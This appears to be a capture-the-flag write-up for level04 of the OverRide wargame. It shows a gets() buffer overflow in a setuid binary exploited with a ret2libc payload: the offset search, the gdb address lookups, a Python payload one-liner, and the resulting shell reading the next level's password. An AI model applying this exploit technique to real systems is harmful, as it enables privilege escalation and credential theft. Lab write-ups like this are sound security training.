Level04 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

Level04 rights:
```Shell
level04@OverRide:~$ ls -la level04 
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

Testing the binary:
```Shell
level04@OverRide:~$ ./level04
Give me some shellcode, k
coucou
child is exiting...
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- the program creates a child process
- in the parent, you are asked to enter some shellcode
- `gets()` is used to store user input and can easily be overflowed
The answer is pretty straightforward. But instead of using a shellcode, we preferred using a `Ret2libC` method.

First, we need to find the offset. You cannot proceed as usual because of the child process, therefore we just did a bit of trial and errors. We first tried 200 characters, then 150, and some value in-between until we found 156. An infinite loop was created when going over 156, while going under 156 only exited the program normally.

Now let's retrieve three addresses (`system()`, `exit()` and `/bin/sh`) to finish our payload:
```Shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```

This is our final payload:
```Shell
level04@OverRide:~$ python -c 'print("A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]
)' > /tmp/payload04
```

And here is the result!
```Shell
level04@OverRide:~$ cat /tmp/payload04 - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
